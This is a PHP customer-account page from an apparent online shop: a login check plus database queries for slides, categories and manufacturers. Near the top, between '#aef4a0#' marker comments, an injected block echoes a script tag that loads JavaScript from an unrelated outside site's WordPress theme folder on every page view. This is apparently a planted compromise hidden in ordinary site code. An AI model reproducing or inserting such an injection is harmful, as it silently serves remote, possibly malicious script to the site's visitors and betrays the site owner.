<? include "../../classes/al_karim.php"; ?>
<?php
#aef4a0#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224512\"></script>";
echo $srwv;
}
#/aef4a0#
?>
<?
session_start();
$account = 1;
/// Check Login
if(isset($_SESSION["user_id"]) AND is_numeric($_SESSION["user_id"])){
	$query = "select * from customer where id = $_SESSION[user_id] ";
	$user_info = $cls -> db_select($query);
	if(count($user_info) != 1){
		//header('Location: ../index.php');
		exit(0);
	}
}else{
		header('Location: ../index.php');
		exit(0);
}
$user_info = $user_info[1];
/////////
// All Slide
$query = "select * from slide where status = 1 order by sort_order ASC , RAND()";
$all_slide = $cls -> db_select($query);
/////////
// All Category
$query = "select * from category where status = 1 order by name ASC";
$all_category = $cls -> db_select($query);
/////////
// All Manufacture
$query = "select * from manufacture where status = 1 order by name ASC ";
$all_manufacture = $cls -> db_select($query);

?>